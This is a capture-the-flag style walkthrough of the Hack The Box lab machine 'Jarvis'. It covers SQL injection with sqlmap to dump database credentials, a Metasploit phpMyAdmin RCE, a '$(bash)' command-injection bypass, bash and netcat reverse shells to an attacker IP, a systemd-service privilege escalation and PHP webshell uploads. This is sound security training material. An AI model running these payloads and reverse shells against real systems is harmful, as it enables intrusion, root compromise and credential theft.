---
layout: post
title: Hackthebox Jarvis Walkthrough
categories: HackTheBox
---

![placeholder](https://media.githubusercontent.com/media/1n4r1/1n4r1.github.io/master/public/images/2019-11-10/jarvis-badge.png)
# Explanation
<a href="https://www.hackthebox.eu">Hackthebox</a> is a website which has a bunch of vulnerable machines in its own VPN.<br>
To learn a new technique/knowledge, solve all machines (As much as possible!!).<br>
This is a walkthrough of a box "Jarvis".<br>

# Solution
### 1. Initial Enumeration

TCP Port Scanning:
{% highlight shell %}
root@kali:~# nmap -p- 10.10.10.143 -sV -sC
Starting Nmap 7.80 ( https://nmap.org ) at 2019-11-07 13:41 EET
Nmap scan report for 10.10.10.143
Host is up (0.047s latency).
Not shown: 65532 closed ports
PORT      STATE SERVICE VERSION
22/tcp    open  ssh     OpenSSH 7.4p1 Debian 10+deb9u6 (protocol 2.0)
| ssh-hostkey: 
|   2048 03:f3:4e:22:36:3e:3b:81:30:79:ed:49:67:65:16:67 (RSA)
|   256 25:d8:08:a8:4d:6d:e8:d2:f8:43:4a:2c:20:c8:5a:f6 (ECDSA)
|_  256 77:d4:ae:1f:b0:be:15:1f:f8:cd:c8:15:3a:c3:69:e1 (ED25519)
80/tcp    open  http    Apache httpd 2.4.25 ((Debian))
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
|_http-server-header: Apache/2.4.25 (Debian)
|_http-title: Stark Hotel
64999/tcp open  http    Apache httpd 2.4.25 ((Debian))
|_http-server-header: Apache/2.4.25 (Debian)
|_http-title: Site doesn't have a title (text/html).
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 139.42 seconds
{% endhighlight %}

Gobuster HTTP port 80:
{% highlight shell %}
root@kali:~# gobuster dir -u http://10.10.10.143 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x .html,.php -s '200,204,301,302,403'
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://10.10.10.143
[+] Threads:        10
[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Status codes:   200,204,301,302,403
[+] User Agent:     gobuster/3.0.1
[+] Extensions:     html,php
[+] Timeout:        10s
===============================================================
2019/11/07 13:48:16 Starting gobuster
===============================================================
/index.php (Status: 200)
/images (Status: 301)
/nav.php (Status: 200)
/footer.php (Status: 200)
/css (Status: 301)
/js (Status: 301)
/fonts (Status: 301)
/phpmyadmin (Status: 301)
/connection.php (Status: 200)
/room.php (Status: 302)
/sass (Status: 301)
/server-status (Status: 403)
===============================================================
2019/11/07 14:40:04 Finished
===============================================================
{% endhighlight %}

Gobuster HTTP port 64999:
{% highlight shell %}
root@kali:~# gobuster dir -u http://10.10.10.143:64999/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x .html,.php -s '200,204,301,302,403'
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://10.10.10.143:64999/
[+] Threads:        10
[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Status codes:   200,204,301,302,403
[+] User Agent:     gobuster/3.0.1
[+] Extensions:     html,php
[+] Timeout:        10s
===============================================================
2019/11/07 14:42:47 Starting gobuster
===============================================================
/index.html (Status: 200)
/server-status (Status: 403)
===============================================================
2019/11/07 15:34:39 Finished
===============================================================
{% endhighlight %}

### 2. Getting User

On the port 80, there is a website which we can researve a room of a hotel.
![placeholder](https://media.githubusercontent.com/media/1n4r1/1n4r1.github.io/master/public/images/2019-11-10/2019-11-09-19-40-46.png)

In the path "/room.php", we have a parameter for GET request which is "cod".
![placeholder](https://media.githubusercontent.com/media/1n4r1/1n4r1.github.io/master/public/images/2019-11-10/2019-11-09-19-41-30.png)

By putting a single quote, we can confirm that there is no picture.<br>
This means that the parameter "cod" is not handled appropriately.
![placeholder](https://media.githubusercontent.com/media/1n4r1/1n4r1.github.io/master/public/images/2019-11-10/2019-11-09-19-41-57.png)

Then, we can try to check if there is really a SQL injection.<br>
We can use SQLmap and figure out that the parameter "cod" is actually vulnerable.
{% highlight shell %}
root@kali:~# sqlmap -u http://10.10.10.143/room.php?cod=1
        ___
       __H__
 ___ ___[,]_____ ___ ___  {1.3.10#stable}
|_ -| . [,]     | .'| . |
|___|_  [']_|_|_|__,|  _|
      |_|V...       |_|   http://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

~~~

GET parameter 'cod' is vulnerable. Do you want to keep testing the others (if any)? [y/N] N
sqlmap identified the following injection point(s) with a total of 72 HTTP(s) requests:
---
Parameter: cod (GET)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: cod=1 AND 3862=3862

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: cod=1 AND (SELECT 6380 FROM (SELECT(SLEEP(5)))sIAL)

    Type: UNION query
    Title: Generic UNION query (NULL) - 7 columns
    Payload: cod=-3382 UNION ALL SELECT NULL,CONCAT(0x7176767871,0x724a4941577351594f52566f7673496e674b42744c4354476f78444c555252715565706d504c6474,0x7178717171),NULL,NULL,NULL,NULL,NULL-- AKaz
---
[19:45:48] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Debian 9.0 (stretch)
web application technology: PHP, Apache 2.4.25
back-end DBMS: MySQL >= 5.0.12
[19:45:48] [INFO] fetched data logged to text files under '/root/.sqlmap/output/10.10.10.143'

[*] ending @ 19:45:48 /2019-11-09/
{% endhighlight %}

Next, we use SQLmap with an option "--password".<br>
We can ahieve following credential.
{% highlight shell %}
DBadmin:imissyou
{% endhighlight %}
{% highlight shell %}
root@kali:~# sqlmap -u http://10.10.10.143/room.php?cod=1 --passwords
        ___
       __H__
 ___ ___[,]_____ ___ ___  {1.3.10#stable}
|_ -| . [(]     | .'| . |
|___|_  [(]_|_|_|__,|  _|
      |_|V...       |_|   http://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 20:59:50 /2019-11-09/

~~~

database management system users password hashes:
[*] DBadmin [1]:
    password hash: *2D2B7A5E4E637B8FBA1D17F40318F277D29964D0
    clear-text password: imissyou

[21:00:11] [INFO] fetched data logged to text files under '/root/.sqlmap/output/10.10.10.143'

[*] ending @ 21:00:11 /2019-11-09/
{% endhighlight %}

After that, try to login to phpadmin with the credential.<br>
We can figure out that the version of phpmyadmin is "4.8.0"
![placeholder](https://media.githubusercontent.com/media/1n4r1/1n4r1.github.io/master/public/images/2019-11-10/2019-11-09-21-33-11.png)

Metasploit has several exploits for Authenticated remote code execution of phpmyadmin.
{% highlight shell %}
msf5 > search phpmyadmin

Matching Modules
================

   #  Name                                                  Disclosure Date  Rank       Check  Description
   -  ----                                                  ---------------  ----       -----  -----------
   0  auxiliary/admin/http/telpho10_credential_dump         2016-09-02       normal     No     Telpho10 Backup Credentials Dumper
   1  auxiliary/scanner/http/phpmyadmin_login                                normal     Yes    PhpMyAdmin Login Scanner
   2  exploit/multi/http/phpmyadmin_3522_backdoor           2012-09-25       normal     No     phpMyAdmin 3.5.2.2 server_sync.php Backdoor
   3  exploit/multi/http/phpmyadmin_lfi_rce                 2018-06-19       good       Yes    phpMyAdmin Authenticated Remote Code Execution
   4  exploit/multi/http/phpmyadmin_null_termination_exec   2016-06-23       excellent  Yes    phpMyAdmin Authenticated Remote Code Execution
   5  exploit/multi/http/phpmyadmin_preg_replace            2013-04-25       excellent  Yes    phpMyAdmin Authenticated Remote Code Execution via preg_replace()
   6  exploit/multi/http/zpanel_information_disclosure_rce  2014-01-30       excellent  No     Zpanel Remote Unauthenticated RCE
   7  exploit/unix/webapp/phpmyadmin_config                 2009-03-24       excellent  No     PhpMyAdmin Config File Code Injection
   8  post/linux/gather/phpmyadmin_credsteal                                 normal     No     Phpmyadmin credentials stealer


msf5 >
{% endhighlight %}

This time, "exploit/multi/http/phpmyadmin_lfi_rce" was used.
{% highlight shell %}
msf5 > use exploit/multi/http/phpmyadmin_lfi_rce 
msf5 exploit(multi/http/phpmyadmin_lfi_rce) > show options

Module options (exploit/multi/http/phpmyadmin_lfi_rce):

   Name       Current Setting  Required  Description
   ----       ---------------  --------  -----------
   PASSWORD                    no        Password to authenticate with
   Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS                      yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
   RPORT      80               yes       The target port (TCP)
   SSL        false            no        Negotiate SSL/TLS for outgoing connections
   TARGETURI  /phpmyadmin/     yes       Base phpMyAdmin directory path
   USERNAME   root             yes       Username to authenticate with
   VHOST                       no        HTTP server virtual host


Exploit target:

   Id  Name
   --  ----
   0   Automatic


msf5 exploit(multi/http/phpmyadmin_lfi_rce) > set password imissyou
password => imissyou
msf5 exploit(multi/http/phpmyadmin_lfi_rce) > set username DBadmin
username => DBadmin
msf5 exploit(multi/http/phpmyadmin_lfi_rce) > set rhosts 10.10.10.143
rhosts => 10.10.10.143
msf5 exploit(multi/http/phpmyadmin_lfi_rce) > run

[*] Started reverse TCP handler on 10.10.14.13:4444 
[*] Sending stage (38288 bytes) to 10.10.10.143
[*] Meterpreter session 1 opened (10.10.14.13:4444 -> 10.10.10.143:43688) at 2019-11-10 12:27:06 +0200
[-] 10.10.10.143:80 - Failed to drop database ozviz. Might drop when your session closes.

meterpreter > getuid
Server username: www-data (33)
meterpreter >
{% endhighlight %}

By running "sudo -l", we can find that user "pepper" can run "simpler.py" as root.
{% highlight shell %}
meterpreter > shell
Process 4892 created.
Channel 1 created.
sudo -l
Matching Defaults entries for www-data on jarvis:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User www-data may run the following commands on jarvis:
    (pepper : ALL) NOPASSWD: /var/www/Admin-Utilities/simpler.py
{% endhighlight %}

Then, take a look at "simpler.py".
{% highlight shell %}
meterpreter > cat  /var/www/Admin-Utilities/simpler.py
#!/usr/bin/env python3
from datetime import datetime
import sys
import os
from os import listdir
import re

def show_help():
    message='''
********************************************************
* Simpler   -   A simple simplifier ;)                 *
* Version 1.0                                          *
********************************************************
Usage:  python3 simpler.py [options]

Options:
    -h/--help   : This help
    -s          : Statistics
    -l          : List the attackers IP
    -p          : ping an attacker IP
    '''
    print(message)

def show_header():
    print('''***********************************************
     _                 _                       
 ___(_)_ __ ___  _ __ | | ___ _ __ _ __  _   _ 
/ __| | '_ ` _ \| '_ \| |/ _ \ '__| '_ \| | | |
\__ \ | | | | | | |_) | |  __/ |_ | |_) | |_| |
|___/_|_| |_| |_| .__/|_|\___|_(_)| .__/ \__, |
                |_|               |_|    |___/ 
                                @ironhackers.es
                                
***********************************************
''')

def show_statistics():
    path = '/home/pepper/Web/Logs/'
    print('Statistics\n-----------')
    listed_files = listdir(path)
    count = len(listed_files)
    print('Number of Attackers: ' + str(count))
    level_1 = 0
    dat = datetime(1, 1, 1)
    ip_list = []
    reks = []
    ip = ''
    req = ''
    rek = ''
    for i in listed_files:
        f = open(path + i, 'r')
        lines = f.readlines()
        level2, rek = get_max_level(lines)
        fecha, requ = date_to_num(lines)
        ip = i.split('.')[0] + '.' + i.split('.')[1] + '.' + i.split('.')[2] + '.' + i.split('.')[3]
        if fecha > dat:
            dat = fecha
            req = requ
            ip2 = i.split('.')[0] + '.' + i.split('.')[1] + '.' + i.split('.')[2] + '.' + i.split('.')[3]
        if int(level2) > int(level_1):
            level_1 = level2
            ip_list = [ip]
            reks=[rek]
        elif int(level2) == int(level_1):
            ip_list.append(ip)
            reks.append(rek)
        f.close()
	
    print('Most Risky:')
    if len(ip_list) > 1:
        print('More than 1 ip found')
    cont = 0
    for i in ip_list:
        print('    ' + i + ' - Attack Level : ' + level_1 + ' Request: ' + reks[cont])
        cont = cont + 1
	
    print('Most Recent: ' + ip2 + ' --> ' + str(dat) + ' ' + req)
	
def list_ip():
    print('Attackers\n-----------')
    path = '/home/pepper/Web/Logs/'
    listed_files = listdir(path)
    for i in listed_files:
        f = open(path + i,'r')
        lines = f.readlines()
        level,req = get_max_level(lines)
        print(i.split('.')[0] + '.' + i.split('.')[1] + '.' + i.split('.')[2] + '.' + i.split('.')[3] + ' - Attack Level : ' + level)
        f.close()

def date_to_num(lines):
    dat = datetime(1,1,1)
    ip = ''
    req=''
    for i in lines:
        if 'Level' in i:
            fecha=(i.split(' ')[6] + ' ' + i.split(' ')[7]).split('\n')[0]
            regex = '(\d+)-(.*)-(\d+)(.*)'
            logEx=re.match(regex, fecha).groups()
            mes = to_dict(logEx[1])
            fecha = logEx[0] + '-' + mes + '-' + logEx[2] + ' ' + logEx[3]
            fecha = datetime.strptime(fecha, '%Y-%m-%d %H:%M:%S')
            if fecha > dat:
                dat = fecha
                req = i.split(' ')[8] + ' ' + i.split(' ')[9] + ' ' + i.split(' ')[10]
    return dat, req
			
def to_dict(name):
    month_dict = {'Jan':'01','Feb':'02','Mar':'03','Apr':'04', 'May':'05', 'Jun':'06','Jul':'07','Aug':'08','Sep':'09','Oct':'10','Nov':'11','Dec':'12'}
    return month_dict[name]
	
def get_max_level(lines):
    level=0
    for j in lines:
        if 'Level' in j:
            if int(j.split(' ')[4]) > int(level):
                level = j.split(' ')[4]
                req=j.split(' ')[8] + ' ' + j.split(' ')[9] + ' ' + j.split(' ')[10]
    return level, req
	
def exec_ping():
    forbidden = ['&', ';', '-', '`', '||', '|']
    command = input('Enter an IP: ')
    for i in forbidden:
        if i in command:
            print('Got you')
            exit()
    os.system('ping ' + command)

if __name__ == '__main__':
    show_header()
    if len(sys.argv) != 2:
        show_help()
        exit()
    if sys.argv[1] == '-h' or sys.argv[1] == '--help':
        show_help()
        exit()
    elif sys.argv[1] == '-s':
        show_statistics()
        exit()
    elif sys.argv[1] == '-l':
        list_ip()
        exit()
    elif sys.argv[1] == '-p':
        exec_ping()
        exit()
    else:
        show_help()
        exit()
meterpreter > 
{% endhighlight %}

Take a look at "exec_ping."<br>
We can confirm that "exec_ping " is executing our input with no checking of "$".
{% highlight python %}
def exec_ping():
    forbidden = ['&', ';', '-', '`', '||', '|']
    command = input('Enter an IP: ')
    for i in forbidden:
        if i in command:
            print('Got you')
            exit()
    os.system('ping ' + command)
{% endhighlight %}

Besides, get a full shell like following.
{% highlight shell %}
python -c 'import pty;pty.spawn("/bin/bash")'
www-data@jarvis:/var/www/Admin-Utilities$
{% endhighlight %}

With following way, we can execute arbitrary command.
{% highlight shell %}
www-data@jarvis:/var/www/Admin-Utilities$ sudo -u pepper /var/www/Admin-Utilities/simpler.py -p
***********************************************
     _                 _                       
 ___(_)_ __ ___  _ __ | | ___ _ __ _ __  _   _ 
/ __| | '_ ` _ \| '_ \| |/ _ \ '__| '_ \| | | |
\__ \ | | | | | | |_) | |  __/ |_ | |_) | |_| |
|___/_|_| |_| |_| .__/|_|\___|_(_)| .__/ \__, |
                |_|               |_|    |___/ 
                                @ironhackers.es
                                
***********************************************

Enter an IP: $(bash)
$(bash)
pepper@jarvis:/var/www/Admin-Utilities$
{% endhighlight %}

However, we can't get any output from this terminal.<br>
So get another reverse shell as a user "pepper".<br>
To launch a netcat listener and execute following command as a user "pepper".
{% highlight shell %}
pepper@jarvis:/home$ bash -i >& /dev/tcp/10.10.14.13/443 0>&1
bash -i >& /dev/tcp/10.10.14.13/443 0>&1

{% endhighlight %}
{% highlight shell %}
root@kali:~# nc -nlvp 443
listening on [any] 443 ...
connect to [10.10.14.13] from (UNKNOWN) [10.10.10.143] 55322
pepper@jarvis:/home$ id
id
uid=1000(pepper) gid=1000(pepper) groups=1000(pepper)
pepper@jarvis:/home$ 
{% endhighlight %}

user.txt in in the directory "/home/pepper".
{% highlight shell %}
pepper@jarvis:~$ ls -l
ls -l
total 12
drwxr-xr-x 3 pepper pepper 4096 Mar  4  2019 Web
-rw-r--r-- 1 pepper pepper  114 Nov  9 10:18 arnotic.service
-r--r----- 1 root   pepper   33 Mar  5  2019 user.txt
pepper@jarvis:~$ cat user.txt
cat user.txt
2afa36c4f05b37b34259c93551f5c44f
pepper@jarvis:~$
{% endhighlight %}

### 3. Getting Root

As always, check SUID binary.<br>
The interesting thing is that user "pepper" can run "systemctl" as root.
{% highlight shell %}
pepper@jarvis:~$ find / -perm -4000 -exec ls -al {} \; 2>/dev/null
find / -perm -4000 -exec ls -al {} \; 2>/dev/null
-rwsr-xr-x 1 root root 30800 Aug 21  2018 /bin/fusermount
-rwsr-xr-x 1 root root 44304 Mar  7  2018 /bin/mount
-rwsr-xr-x 1 root root 61240 Nov 10  2016 /bin/ping
-rwsr-x--- 1 root pepper 174520 Feb 17  2019 /bin/systemctl
-rwsr-xr-x 1 root root 31720 Mar  7  2018 /bin/umount
-rwsr-xr-x 1 root root 40536 May 17  2017 /bin/su
-rwsr-xr-x 1 root root 40312 May 17  2017 /usr/bin/newgrp
-rwsr-xr-x 1 root root 59680 May 17  2017 /usr/bin/passwd
-rwsr-xr-x 1 root root 75792 May 17  2017 /usr/bin/gpasswd
-rwsr-xr-x 1 root root 40504 May 17  2017 /usr/bin/chsh
-rwsr-xr-x 1 root root 140944 Jun  5  2017 /usr/bin/sudo
-rwsr-xr-x 1 root root 50040 May 17  2017 /usr/bin/chfn
-rwsr-xr-x 1 root root 10232 Mar 28  2017 /usr/lib/eject/dmcrypt-get-device
-rwsr-xr-x 1 root root 440728 Mar  1  2019 /usr/lib/openssh/ssh-keysign
-rwsr-xr-- 1 root messagebus 42992 Mar  2  2018 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
{% endhighlight %}

According to <a href="https://medium.com/@magrabursofily/exploit-poc-linux-unprivileged-user-access-to-systemctl-command-cve-2018-19788-fb4bfb11bcbc">this article</a>, we can execute any command with this security gap.<br>
To obtain this purpose, at first, confirm that we have old version of "nc" command.
{% highlight shell %}
pepper@jarvis:~$ nc -h
nc -h
[v1.10-41+b1]
connect to somewhere:	nc [-options] hostname port[s] [ports] ... 
listen for inbound:	nc -l -p port [-options] [hostname] [port]
options:
	-c shell commands	as `-e'; use /bin/sh to exec [dangerous!!]
	-e filename		program to exec after connect [dangerous!!]
	-b			allow broadcasts
	-g gateway		source-routing hop point[s], up to 8
	-G num			source-routing pointer: 4, 8, 12, ...
	-h			this cruft
	-i secs			delay interval for lines sent, ports scanned
        -k                      set keepalive option on socket
	-l			listen mode, for inbound connects
	-n			numeric-only IP addresses, no DNS
	-o file			hex dump of traffic
	-p port			local port number
	-r			randomize local and remote ports
	-q secs			quit after EOF on stdin and delay of secs
	-s addr			local source address
	-T tos			set Type Of Service
	-t			answer TELNET negotiation
	-u			UDP mode
	-v			verbose [use twice to be more verbose]
	-w secs			timeout for connects and final net reads
	-C			Send CRLF as line-ending
	-z			zero-I/O mode [used for scanning]
port numbers can be individual or ranges: lo-hi [inclusive];
hyphens in port names must be backslash escaped (e.g. 'ftp\-data').
pepper@jarvis:~$
{% endhighlight %}

Then, create a config file.
{% highlight shell %}
pepper@jarvis:~$ cat privesc.service
cat privesc.service
[Service]
Type=simple
ExecStart=/bin/nc -e /bin/bash 10.10.14.13 1234
[Install]
WantedBy=multi-user.target
{% endhighlight %}

After that, launch a netcat listener and execute the "privesc.service" with following commands.<br>
We can achieve a reverse shell as a root user.
{% highlight shell %}
pepper@jarvis:~$ /bin/systemctl link /home/pepper/privesc.service
/bin/systemctl link /home/pepper/privesc.service
Created symlink /etc/systemd/system/privesc.service -> /home/pepper/privesc.service.
pepper@jarvis:~$ /bin/systemctl start privesc.service
/bin/systemctl start privesc.service
{% endhighlight %}
{% highlight shell %}
root@kali:~# nc -nlvp 1234
listening on [any] 1234 ...
connect to [10.10.14.13] from (UNKNOWN) [10.10.10.143] 39858
id
uid=0(root) gid=0(root) groups=0(root)

ip a
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
    inet6 ::1/128 scope host 
       valid_lft forever preferred_lft forever
2: ens33: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc pfifo_fast state UNKNOWN group default qlen 1000
    link/ether 00:50:56:b9:9b:05 brd ff:ff:ff:ff:ff:ff
    inet 10.10.10.143/24 brd 10.10.10.255 scope global ens33
       valid_lft forever preferred_lft forever
    inet6 dead:beef::250:56ff:feb9:9b05/64 scope global mngtmpaddr dynamic 
       valid_lft 86325sec preferred_lft 14325sec
    inet6 fe80::250:56ff:feb9:9b05/64 scope link 
       valid_lft forever preferred_lft forever
{% endhighlight %}

root.txt is in the directory "/root".
{% highlight shell %}
ls -l /root
total 16
-rwxr--r-- 1 root root   42 Mar  4  2019 clean.sh
-r-------- 1 root root   33 Mar  5  2019 root.txt
-rwxr-xr-x 1 root root 5271 Mar  5  2019 sqli_defender.py
cat /root/root.txt
d41d8cd98f00b204e9800998ecf84271
{% endhighlight %}

### 4. Another way to get www-data shell

We have SQL injection here.<br>
For this machine, we can use it to achieve a user shell.<br>

#### 4.1 --os-shell way

A way that we use SQLmap with "--os-shell" parameter
{% highlight shell %}
root@kali:~# sqlmap -u http://10.10.10.143/room.php?cod=1 --random-agent --os-shell
        ___
       __H__
 ___ ___[(]_____ ___ ___  {1.3.10#stable}
|_ -| . [']     | .'| . |
|___|_  [']_|_|_|__,|  _|
      |_|V...       |_|   http://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 19:22:26 /2019-11-10/

[19:22:26] [INFO] fetched random HTTP User-Agent header value 'Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/532.0 (KHTML, like Gecko) Chrome/3.0.195.1 Safari/532.0' from file '/usr/share/sqlmap/data/txt/user-agents.txt'
[19:22:26] [INFO] resuming back-end DBMS 'mysql' 
[19:22:26] [INFO] testing connection to the target URL
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: cod (GET)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: cod=1 AND 3862=3862

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: cod=1 AND (SELECT 6380 FROM (SELECT(SLEEP(5)))sIAL)

    Type: UNION query
    Title: Generic UNION query (NULL) - 7 columns
    Payload: cod=-3382 UNION ALL SELECT NULL,CONCAT(0x7176767871,0x724a4941577351594f52566f7673496e674b42744c4354476f78444c555252715565706d504c6474,0x7178717171),NULL,NULL,NULL,NULL,NULL-- AKaz
---
[19:22:26] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Debian 9.0 (stretch)
web application technology: PHP, Apache 2.4.25
back-end DBMS: MySQL >= 5.0.12
[19:22:26] [INFO] going to use a web backdoor for command prompt
[19:22:26] [INFO] fingerprinting the back-end DBMS operating system
[19:22:26] [INFO] the back-end DBMS operating system is Linux
which web application language does the web server support?
[1] ASP
[2] ASPX
[3] JSP
[4] PHP (default)
[19:22:28] [WARNING] unable to automatically retrieve the web server document root
what do you want to use for writable directory?
[1] common location(s) ('/var/www/, /var/www/html, /var/www/htdocs, /usr/local/apache2/htdocs, /usr/local/www/data, /var/apache2/htdocs, /var/www/nginx-default, /srv/www/htdocs') (default)
[2] custom location(s)
[3] custom directory list file
[4] brute force search
[19:22:29] [INFO] retrieved web server absolute paths: '/images/'
[19:22:29] [INFO] trying to upload the file stager on '/var/www/' via LIMIT 'LINES TERMINATED BY' method
[19:22:29] [WARNING] unable to upload the file stager on '/var/www/'
[19:22:29] [INFO] trying to upload the file stager on '/var/www/' via UNION method
[19:22:29] [WARNING] expect junk characters inside the file as a leftover from UNION query
[19:22:29] [WARNING] it looks like the file has not been written (usually occurs if the DBMS process user has no write privileges in the destination path)
[19:22:30] [INFO] trying to upload the file stager on '/var/www/html/' via LIMIT 'LINES TERMINATED BY' method
[19:22:30] [INFO] the file stager has been successfully uploaded on '/var/www/html/' - http://10.10.10.143:80/tmpusmti.php
[19:22:30] [INFO] the backdoor has been successfully uploaded on '/var/www/html/' - http://10.10.10.143:80/tmpbescf.php
[19:22:30] [INFO] calling OS shell. To quit type 'x' or 'q' and press ENTER
os-shell> id
do you want to retrieve the command standard output? [Y/n/a] Y
command standard output: 'uid=33(www-data) gid=33(www-data) groups=33(www-data)'
os-shell> 
{% endhighlight %}

#### 4.2 --file-write way

A way that we use "--file-write" option of SQLmap.<br>
Upload a webshell and manually run commands by forging http requests.
{% highlight shell %}
root@kali:~# sqlmap -u http://10.10.10.143/room.php?cod=1 --random-agent --file-write /usr/share/webshells/php/simple-backdoor.php --file-dest /var/www/html/cmd.php
        ___
       __H__
 ___ ___["]_____ ___ ___  {1.3.10#stable}
|_ -| . ["]     | .'| . |
|___|_  [.]_|_|_|__,|  _|
      |_|V...       |_|   http://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 19:28:11 /2019-11-10/

[19:28:11] [INFO] fetched random HTTP User-Agent header value 'Mozilla/5.0 (Windows; U; Windows NT 6.0; fr; rv:1.9.2.28) Gecko/20120306 Firefox/3.6.28' from file '/usr/share/sqlmap/data/txt/user-agents.txt'
[19:28:11] [INFO] resuming back-end DBMS 'mysql' 
[19:28:11] [INFO] testing connection to the target URL
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: cod (GET)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: cod=1 AND 3862=3862

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: cod=1 AND (SELECT 6380 FROM (SELECT(SLEEP(5)))sIAL)

    Type: UNION query
    Title: Generic UNION query (NULL) - 7 columns
    Payload: cod=-3382 UNION ALL SELECT NULL,CONCAT(0x7176767871,0x724a4941577351594f52566f7673496e674b42744c4354476f78444c555252715565706d504c6474,0x7178717171),NULL,NULL,NULL,NULL,NULL-- AKaz
---
[19:28:11] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Debian 9.0 (stretch)
web application technology: PHP, Apache 2.4.25
back-end DBMS: MySQL >= 5.0.12
[19:28:11] [INFO] fingerprinting the back-end DBMS operating system
[19:28:11] [INFO] the back-end DBMS operating system is Linux
[19:28:11] [WARNING] expect junk characters inside the file as a leftover from UNION query
do you want confirmation that the local file '/usr/share/webshells/php/simple-backdoor.php' has been successfully written on the back-end DBMS file system ('/var/www/html/cmd.php')? [Y/n] Y
[19:28:18] [INFO] the remote file '/var/www/html/cmd.php' is larger (334 B) than the local file '/usr/share/webshells/php/simple-backdoor.php' (328B)
[19:28:18] [INFO] fetched data logged to text files under '/root/.sqlmap/output/10.10.10.143'

[*] ending @ 19:28:18 /2019-11-10/

root@kali:~#
{% endhighlight%}
{% highlight shell %}
root@kali:~# curl 'http://10.10.10.143/cmd.php?cmd=id'
<!-- Simple PHP backdoor by DK (http://michaeldaw.org) -->

<pre>uid=33(www-data) gid=33(www-data) groups=33(www-data)
</pre>
{% endhighlight %}
